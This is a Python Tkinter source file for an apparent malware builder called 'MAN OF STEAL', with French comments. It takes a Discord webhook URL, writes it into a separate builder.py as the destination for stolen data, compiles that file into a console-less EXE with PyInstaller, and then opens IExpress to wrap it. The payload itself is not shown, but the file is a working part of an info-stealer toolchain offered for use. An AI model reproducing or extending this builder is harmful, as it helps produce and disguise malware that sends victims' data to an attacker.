import customtkinter
import tkinter as tk
from tkinter import filedialog
from PIL import Image, ImageTk
from tkinter import messagebox
from tkinter import ttk
from tkinter.font import Font
import subprocess
import os
import shutil
import re
import threading


bg="black"
root = tk.Tk()
root.attributes("-fullscreen", False)
root.geometry("1000x600")
root.config(bg=bg)

def exit():
    root.destroy()

def restore():
    shutil.rmtree("../build")
    shutil.rmtree("../dist")
    os.remove("../builder.spec")

    builder_file_path = "./builder.py"

    
    pattern = r"^(\s*webhook_url\s*=\s*['\"]).*"


    
    with open(builder_file_path, "r") as file:
        content = file.read()

    
    content = re.sub(pattern, r'\1WEBHOOK_LINK"', content, flags=re.MULTILINE)



    
    with open(builder_file_path, "w") as file:
        file.write(content)
    
    replace_first_line("../flags.txt", "0") 


def replace_first_line(file_path, new_line):
    
    with open(file_path, 'r') as file:
        lines = file.readlines()

    
    lines[0] = new_line + '\n'

    
    with open(file_path, 'w') as file:
        file.writelines(lines)


def discord_click():
    webhook_link = discord_input.get()
    update_builder_file(webhook_link)

def update_builder_file(webhook_link):
    
    builder_file_path = "./builder.py"
    
    with open(builder_file_path, "r") as file:
        content = file.read()
    content = content.replace("WEBHOOK_LINK", webhook_link)
    
    with open(builder_file_path, "w") as file:
        file.write(content)
    
    replace_first_line("../flags.txt", "1") # on remplace le flag 0 par 1 pour spécifier qu'on a un webhook link

    


def iexpress():
    
    subprocess.run(["iexpress.exe"])


def execute_powershell_command(progress_window, progress_bar):
    # Lancer la commande dans PowerShell
    subprocess.run(["powershell", "pyinstaller -F ./builder.py --noconsole"])
    shutil.move("./build", "../build")
    shutil.move("./dist", "../dist")
    shutil.move("./builder.spec", "../builder.spec")
    progress_bar.stop()
    iexpress()
    progress_window.destroy()

def generation():
    flags_file_path = "../flags.txt"

    with open(flags_file_path, "r") as file:
        first_line = file.readline().strip()

    if first_line == "1":
        progress_window = tk.Toplevel(root)
        progress_window.title("Generating EXE")
        progress_window.geometry("300x100")
        progress_bar = ttk.Progressbar(progress_window, orient="horizontal", length=200, mode="indeterminate")
        progress_bar.pack(pady=20)
        progress_bar.start()

        # multithread pour la barre de charg
        thread = threading.Thread(target=execute_powershell_command, args=(progress_window, progress_bar))
        thread.start()
    else:
        messagebox.showinfo("Error", "There is no Discord WebHook! Please write your Discord WebHook link!")

    


frame = tk.Frame(master=root)

#########LOGO######
img_logo = Image.open("../images/MOS_logo.png")
resized_logo = img_logo.resize((200,250), Image.Resampling.LANCZOS)
img_logo_resized = ImageTk.PhotoImage(resized_logo)

logo = tk.Label(root, image=img_logo_resized, bg=bg )
logo.pack()

font1=Font(family="Times New Roman", size=30, weight="bold")
title = tk.Label(master=root, text=" MAN OF STEAL ", font=font1, bg=bg, fg="white")
title.pack()

font2=Font(family="Times New Roman", size=15, weight="bold")
name = tk.Label(master=root, text="V.1__By flamendO", font=font2, bg=bg, fg="white")
name.pack()



#################

#entrée Discord
discord_input = customtkinter.CTkEntry(master=root, placeholder_text="Please type your Discord Webhook link...", width=300)
discord_input.pack(side=tk.LEFT, padx=10)

# bouton OK
discord_button = customtkinter.CTkButton(root, text="OK", command=discord_click)
discord_button.pack(side=tk.LEFT, padx=10)

# Bouton génération .exe

generate = customtkinter.CTkButton(master=root, text="Generate EXE", command= generation)
generate.pack(side=tk.LEFT, padx=10)

# Bouton quitter

quit = customtkinter.CTkButton(master=root, text="Exit", command= exit)
quit.pack(side=tk.BOTTOM, pady=50)

# Bouton restore

restore = customtkinter.CTkButton(master=root, text="Restore Parameters", command= restore)
restore.pack(side=tk.BOTTOM, pady=20)


root.mainloop()